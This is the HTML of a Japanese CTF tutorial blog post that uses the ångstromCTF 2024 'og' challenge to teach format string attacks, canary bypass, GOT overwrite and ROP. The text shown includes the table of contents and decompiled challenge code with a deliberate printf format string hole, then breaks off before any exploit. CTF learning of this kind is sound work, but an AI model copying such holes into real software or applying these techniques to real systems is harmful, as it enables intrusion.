<!DOCTYPE html><html lang="ja"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.e71379dda153709d1a9a.css" id="gatsby-global-css">html{font-size:100}body{margin:0 0 0 calc(100vw - 100%);color:#222;line-height:1.4;font-size:.875rem;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#fcfcfc}body,h1,h2,h3,h4,h5,h6{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif}h1,h2,h3,h4,h5,h6{font-weight:600}h1{font-size:1.575rem;line-height:2.25rem;margin-top:5rem;margin-bottom:1.25rem}h2{font-size:1.47656rem;line-height:1.875rem}h2,h3{margin-top:2.5rem;margin-bottom:.625rem}h3{font-size:1.20313rem;line-height:1.25rem}h4{font-size:1.05rem;margin-top:1.875rem}h4,h5{line-height:1.25rem;margin-bottom:.625rem}h5,h6{font-size:.875rem;margin-top:3.125rem}h6{line-height:1.25rem;margin-bottom:.625rem}img{max-width:100%;margin:inherit auto}hr,img{border:0;display:block}hr{color:#222;height:1.625rem;margin:3.25rem auto;background-size:100% 26px;background-image:linear-gradient(180deg,transparent 1px,transparent 11px,#222 0,#222 15px,transparent 0,transparent 26px);width:6.25rem}a{color:#918d40;text-decoration:none}a:active,a:focus,a:hover{color:#a9d159}b,strong{font-weight:600}ul{list-style:square;margin-bottom:1.25rem}ul li{padding:0 .3125rem;margin-bottom:.625rem}p{line-height:1.25rem;margin-bottom:1.25rem}blockquote{font-style:italic;text-align:center;background-color:#f5f5f5;padding:.1875rem .625rem}figure{display:block;width:100%;height:auto}figcaption{line-height:.9375rem;margin-top:.3125rem;color:#222;font-size:.75rem;font-style:italic;margin-bottom:0;text-align:center}.anchor{margin-left:-1.875rem!important;padding-right:.875rem!important}@media screen and (min-width:685px){figure.float-left,figure.float-right{max-width:19.375rem;padding:0 1.25rem}.float-right{float:right}.float-left{float:left}}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}li>code[class*=language-text],p>code[class*=language-text]{background:#f9f9f9!important;color:#2d2d2d!important}.Author-module--author__photo--36xCH{display:inline-block;margin-bottom:0;border-radius:50%;background-clip:padding-box}.Author-module--author__title--2CaTb{font-size:.98438rem;font-weight:600;line-height:1.40625rem;margin:.625rem 0}.Author-module--author__title-link--Yrism,.Author-module--author__title-link--Yrism:focus,.Author-module--author__title-link--Yrism:hover{color:#222}.Author-module--author__subtitle--cAaEB{color:#888;line-height:1.25rem;margin-bottom:1.25rem}.Icon-module--icon--Gpyvw{display:inline-block;width:1em;height:1em;stroke-width:0;stroke:currentColor;fill:currentColor;font-style:normal;font-weight:400;speak:none;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.Contacts-module--contacts--1rGd1{margin-bottom:1.25rem}.Contacts-module--contacts__list--3OgdW{display:flex;flex-flow:row wrap;flex-grow:0;flex-shrink:0;list-style:none;padding:0;margin:.625rem -.1875rem;width:8.75rem}.Contacts-module--contacts__list-item--16p9q{padding:0;margin:.25rem;display:flex;align-content:center;align-items:center;justify-content:center;height:2.1875rem;width:2.1875rem;line-height:2.1875rem;border-radius:50%;text-align:center;border:1px solid #ebebeb}.Contacts-module--contacts__list-item-link--2MIDn{border:0;display:flex;color:#222}.Contacts-module--contacts__list-item-link--2MIDn:focus,.Contacts-module--contacts__list-item-link--2MIDn:hover{color:#918d40}.Copyright-module--copyright--1ariN{color:#b6b6b6;font-size:.75rem}.Menu-module--menu--Efbin{margin-bottom:1.25rem}.Menu-module--menu__list--31Zeo{list-style:none;padding:0;margin:0}.Menu-module--menu__list-item--1lJ6B{padding:0;margin:.625rem 0}.Menu-module--menu__list-item-link--10Ush{font-size:.875rem;color:#222;font-weight:400;border:0}.Menu-module--menu__list-item-link--10Ush:focus,.Menu-module--menu__list-item-link--10Ush:hover{color:#918d40;border-bottom:1px solid #918d40}.Menu-module--menu__list-item-link--active--2CbUO{color:#222;border-bottom:1px solid #222}.Sidebar-module--sidebar--X4z2p{width:100%}.Sidebar-module--sidebar__inner--Jdc5s{position:relative;padding:1.5625rem 1.25rem 0}.Sidebar-module--headerimage--19Rdy{width:100%;min-height:70px;max-height:120px;margin:0 0 .625rem}.Sidebar-module--logo-image--XDYae{min-height:70px;max-height:120px;margin:0 auto}input{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:.625rem;margin:.3125rem 0;border:1px solid #999;border-radius:.3125rem}.Sidebar-module--search-container--17C6F{position:relative}.Sidebar-module--search-container-input--27Tw4{width:100%}.Sidebar-module--search-container-submit--WwtLg{position:absolute;width:2.375rem;height:2.375rem;top:calc(50% - 19px);right:0;border:3px solid #999;border-radius:0 .25rem .25rem 0;background:#999}.Sidebar-module--search-container-submit--WwtLg:before{position:absolute;content:"";width:.9375rem;height:.9375rem;top:calc(50% - 9px);left:calc(50% - 9px);border-radius:50%;box-shadow:0 0 0 2px #fff}.Sidebar-module--search-container-submit--WwtLg:after{position:absolute;content:"";width:.5rem;height:.375rem;top:calc(50% + 6px);left:calc(50% + 2px);border-top:2px solid #fff;transform:rotate(45deg)}@media screen and (min-width:685px){.Sidebar-module--sidebar--X4z2p{width:calc(41.625% - 1.09375rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(12n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(12n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:1.875rem 1.25rem 0}.Sidebar-module--sidebar__inner--Jdc5s:after{background:#e6e6e6;background:linear-gradient(180deg,#e6e6e6 0,#e6e6e6 48%,#fff);position:absolute;content:"";width:.0625rem;height:33.75rem;top:30px;right:-10px;bottom:0}}@media screen and (min-width:960px){.Sidebar-module--sidebar--X4z2p{width:calc(33.3% - 1.25rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(3n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(3n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:2.5rem}}.Layout-module--layout--3Pyz6{max-width:66.875rem;margin-left:auto;margin-right:auto}.Layout-module--layout--3Pyz6:before{content:"";display:table}.Layout-module--layout--3Pyz6:after{content:"";display:table;clear:both}.Feed-module--feed__item--2D5rE{margin-bottom:1.5625rem}.Feed-module--feed__item--2D5rE:last-child{margin-bottom:.625rem}.Feed-module--feed__item-title--3nigr{font-size:1.47656rem;line-height:1.875rem;margin-top:0;margin-bottom:.625rem}.Feed-module--feed__item-title-link--iFMRs{color:#222}.Feed-module--feed__item-title-link--iFMRs:focus,.Feed-module--feed__item-title-link--iFMRs:hover{color:#222;border-bottom:1px solid #222}.Feed-module--feed__item-description--1uO8e{font-size:.875rem;line-height:1.25rem;margin-bottom:.9375rem}.Feed-module--feed__item-meta-time--3t1fg{font-size:.75rem;color:#222;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-divider--N-Q0A{margin:0 .3125rem}.Feed-module--feed__item-meta-category-link--23f8F{font-size:.75rem;color:#a9d159;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-category-link--23f8F:focus,.Feed-module--feed__item-meta-category-link--23f8F:hover{color:#918d40}.Feed-module--feed__item-readmore--1u6bI{font-size:.875rem;color:#918d40}.Feed-module--feed__item-readmore--1u6bI:focus,.Feed-module--feed__item-readmore--1u6bI:hover{color:#918d40;border-bottom:1px solid #918d40}.Page-module--page--2nMky{margin-bottom:2.5rem}.Page-module--page__inner--2M_vz{padding:1.5625rem 1.25rem}.Page-module--page__title--GPD8L{font-size:1.575rem;font-weight:600;line-height:2.5rem;margin-top:0;margin-bottom:1.8125rem}.Page-module--page__body--Ic6i6{font-size:.875rem;line-height:1.25rem;margin:0 0 1.25rem}@media screen and (min-width:685px){.Page-module--page--2nMky{width:calc(58.275% - .78125rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(12n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(12n+1){clear:both}.Page-module--page__inner--2M_vz{padding:1.875rem 1.25rem}}@media screen and (min-width:960px){.Page-module--page--2nMky{width:calc(66.6% - .625rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(3n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(3n+1){clear:both}.Page-module--page__inner--2M_vz{padding:2.5rem 2.1875rem}}.Pagination-module--pagination--2H3nO{margin-top:2.5rem;display:flex}.Pagination-module--pagination__prev--bet5s{width:50%;text-align:left}.Pagination-module--pagination__prev-link--1Nzs6{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__prev-link--1Nzs6:focus,.Pagination-module--pagination__prev-link--1Nzs6:hover{color:#918d40}.Pagination-module--pagination__prev-link--disable--Yklx9{pointer-events:none;color:#bbb}.Pagination-module--pagination__next--3hFiN{width:50%;text-align:right}.Pagination-module--pagination__next-link--3FUtA{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__next-link--3FUtA:focus,.Pagination-module--pagination__next-link--3FUtA:hover{color:#918d40}.Pagination-module--pagination__next-link--disable--30UwZ{pointer-events:none;color:#bbb}.Author-module--author--2Yefr{border-top:1px solid #e6e6e6;max-width:43.75rem;padding-top:1.25rem;line-height:1.25rem;margin-top:1.25rem;margin-bottom:2.5rem}.Author-module--author__bio-twitter--n-O9n{display:block;text-decoration:underline}@media screen and (min-width:685px){.Author-module--author--2Yefr{margin-left:auto;margin-right:auto}}.Content-module--content--3p512{max-width:62.8125rem;padding:0 .9375rem;margin:0 auto}.Content-module--content__title--2BDW9{font-size:1.75rem;max-width:43.75rem;font-weight:600;text-align:center;line-height:2.0625rem;margin:1.25rem auto 0}.Content-module--content__body--2TrQ- figure{margin-bottom:1.25rem}.Content-module--content__body--2TrQ- figure blockquote{font-style:italic;text-align:center;margin-top:0;padding:1.25rem 0}.Content-module--content__body--2TrQ- figure blockquote p{max-width:43.75rem;font-size:1.47149rem;margin-top:1.25rem;margin-bottom:1.25rem;line-height:1.875rem}.Content-module--content__body--2TrQ- a{text-decoration:underline}.Content-module--content__body--2TrQ- *{max-width:43.75rem;margin-left:auto;margin-right:auto}.Content-module--content__body--2TrQ- img{max-width:100%;margin-top:.625rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- li ul{margin-bottom:.625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- h2{position:relative;padding:1rem 1.5rem;color:#fff;border-radius:.625rem;background:#0c0000}.Content-module--content__body--2TrQ- h2:after{position:absolute;bottom:-9px;left:1rem;width:0;height:0;content:"";border-color:#0c0000 transparent transparent;border-style:solid;border-width:10px 10px 0}.Content-module--content__body--2TrQ- h3{border-bottom:3px dotted #0c0000;padding:1rem 0}@media screen and (min-width:960px){.Content-module--content--3p512{padding:0}.Content-module--content__title--2BDW9{font-size:1.75rem;line-height:2.8125rem;margin-top:2.8125rem;margin-bottom:1.875rem}.Content-module--content__body--2TrQ-,.Content-module--content__body--2TrQ- p{font-size:.98438rem;line-height:1.40625rem;margin-bottom:1.40625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}}.Meta-module--meta__date--29eD7{font-style:italic}.Tags-module--tags--1L_ct{margin-bottom:.625rem}.Tags-module--tags__list--91FqN{list-style:none;margin:0 -.625rem;padding:0}.Tags-module--tags__list-item--1M30P{display:inline-block;margin:.625rem .3125rem}.Tags-module--tags__list-item-link--3SL_8{display:inline-block;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;border:1px solid #e6e6e6;text-decoration:none;border-radius:1.25rem;color:#222}.Tags-module--tags__list-item-link--3SL_8:focus,.Tags-module--tags__list-item-link--3SL_8:hover{color:#918d40}.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{max-width:43.75rem;margin:0 auto;padding:0 .9375rem}.Post-module--post__home-button--16Kl0{display:block;max-width:5.625rem;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;text-align:center;color:#222;border:1px solid #e6e6e6;border-radius:1.25rem;font-size:.875rem;font-weight:400;margin-left:auto;margin-right:auto;margin-top:1.25rem}.Post-module--post__home-button--16Kl0:focus,.Post-module--post__home-button--16Kl0:hover{color:#918d40}@media screen and (min-width:960px){.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{padding:0}.Post-module--post__home-button--16Kl0{position:fixed;max-width:auto;margin:0;top:30px;left:30px}}</style><meta name="generator" content="Gatsby 2.32.13"/><link rel="alternate" type="application/rss+xml" title="かえるのひみつきち" href="/rss.xml"/><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-122086587-6"></script><script>
      
      
      if(true) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){window.dataLayer && window.dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-122086587-6', {"send_page_view":false});
      }
      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">よちよち CTFer の Pwn 超入門 - FSB の基礎と ROP のテクニック 編- - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="よちよち CTFer の Pwn 超入門 - FSB の基礎と ROP のテクニック 編-"/><meta data-react-helmet="true" property="og:site_name" content="よちよち CTFer の Pwn 超入門 - FSB の基礎と ROP のテクニック 編- - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/fe8109b2e0e6b66911292538155fe252/ctf-pwn-og.png"/><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"/><meta data-react-helmet="true" name="twitter:title" content="よちよち CTFer の Pwn 超入門 - FSB の基礎と ROP のテクニック 編- - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="よちよち CTFer の Pwn 超入門 - FSB の基礎と ROP のテクニック 編-"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/fe8109b2e0e6b66911292538155fe252/ctf-pwn-og.png"/><link as="script" rel="preload" href="/webpack-runtime-a3c0f166cb4b802ff58f.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-4b437d98a9f47dfe350f.js"/><link as="script" rel="preload" href="/app-558caacb7e565c191396.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/ctf-pwn-og/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">よちよち CTFer の Pwn 超入門 - FSB の基礎と ROP のテクニック 編-</h1><div class="Content-module--content__body--2TrQ-"><p>最近 Pwn の勉強を始めました。</p>
<p>今回はチームの Pwn 担当のアドバイス受けつつ、ångstromCTF 2024 の og を題材にフォーマット文字列攻撃と ROP のテクニックを学んだので Pwn の入門テクニックとしてまとめていきます。</p>
<!-- omit in toc -->
<h2 id="もくじ" style="position:relative;"><a href="#%E3%82%82%E3%81%8F%E3%81%98" aria-label="もくじ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>もくじ</h2>
<ul>
<li><a href="#%E5%95%8F%E9%A1%8C%E3%81%AE%E6%A6%82%E8%A6%81-ogpwn">問題の概要 og(Pwn)</a></li>
<li>
<p><a href="#%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88%E6%96%87%E5%AD%97%E5%88%97%E6%94%BB%E6%92%83%E3%81%AE%E5%9F%BA%E6%9C%AC%E3%81%A8%E5%AE%9F%E8%B7%B5">フォーマット文字列攻撃の基本と実践</a></p>
<ul>
<li><a href="#fsb-%E3%81%A8%E3%81%AF">FSB とは</a></li>
<li><a href="#fsb-%E3%81%A7%E5%87%BA%E5%8A%9B%E5%8F%AF%E8%83%BD%E3%81%AA%E5%80%A4">FSB で出力可能な値</a></li>
<li><a href="#fsb-%E3%81%A7-canary-%E3%82%92%E3%83%AA%E3%83%BC%E3%82%AF%E3%81%99%E3%82%8B">FSB で Canary をリークする</a></li>
<li><a href="#fsb-%E3%81%A7-libc-%E3%81%AE%E3%83%99%E3%83%BC%E3%82%B9%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E3%83%AA%E3%83%BC%E3%82%AF%E3%81%99%E3%82%8B">FSB で libc のベースアドレスをリークする</a></li>
<li><a href="#fsb-%E3%81%A7-got-%E3%82%AA%E3%83%BC%E3%83%90%E3%83%BC%E3%83%A9%E3%82%A4%E3%83%89%E3%82%92%E8%A1%8C%E3%81%86">FSB で GOT オーバーライドを行う</a></li>
<li><a href="#%E8%A7%A3%E6%B3%95-1onegadget-%E3%81%A7-shell-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B">解法 1：OneGadget で Shell を取得する</a></li>
<li><a href="#%E3%81%8A%E3%81%BE%E3%81%91fmtstr_payload--%E3%81%AE%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%81%AB%E4%BB%BB%E6%84%8F%E3%81%AE%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88%E6%96%87%E5%AD%97%E3%82%92%E9%80%A3%E7%B5%90%E3%81%99%E3%82%8B">おまけ：fmtstr_payload  のペイロードに任意のフォーマット文字を連結する</a></li>
</ul>
</li>
<li>
<p><a href="#rop-%E3%81%A8-canary-bypass-%E3%81%AE%E5%AE%9F%E8%B7%B5">ROP と Canary Bypass の実践</a></p>
<ul>
<li><a href="#canary-bypass-%E3%82%92%E8%A1%8C%E3%81%86">Canary Bypass を行う</a></li>
<li><a href="#rop-gadget-%E3%82%92%E9%9B%86%E3%82%81%E3%82%8B">ROP Gadget を集める</a></li>
<li><a href="#%E5%85%A5%E5%8A%9B%E3%81%AE%E5%88%B6%E7%B4%84%E3%82%92%E5%9B%9E%E9%81%BF%E3%81%99%E3%82%8B">入力の制約を回避する</a></li>
<li><a href="#%E8%A7%A3%E6%B3%95-2rop-%E3%81%A7-shell-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B">解法 2：ROP で Shell を取得する</a></li>
</ul>
</li>
<li><a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ</a></li>
</ul>
<h2 id="問題の概要-ogpwn" style="position:relative;"><a href="#%E5%95%8F%E9%A1%8C%E3%81%AE%E6%A6%82%E8%A6%81-ogpwn" aria-label="問題の概要 ogpwn permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>問題の概要 og(Pwn)</h2>
<blockquote>
<p>only the ogs remember go</p>
</blockquote>
<p>この問題で提供される問題バイナリ(ELF)は、主に main と go という 2 つの関数で構成されています。</p>
<p>以下は、各関数のデコンパイル結果です。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token class-name">int64_t</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span><span class="token operator">*</span> fsbase<span class="token punctuation">;</span>
    <span class="token class-name">int64_t</span> rax <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>fsbase <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"kill $PPID; Enter your name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> var_38<span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var_38<span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Gotta go. See you around, "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var_38<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>rax <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>fsbase <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>rax <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>fsbase <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">__stack_chk_fail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* no return */</span>
<span class="token punctuation">}</span>


<span class="token class-name">int32_t</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>バイナリを見てもわかりますが、このプログラムでは Canary が有効化されています。</p>
<p>また、PIE が無効で RELRO(Relocation Read-Only) は Partial RELRO なので、比較的容易に GOT オーバーライドを使用できそうなことがわかります。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 371px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/c9dc109b3c5b4ba18e2047fe722a8469/d4635/image-20240604211454156.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
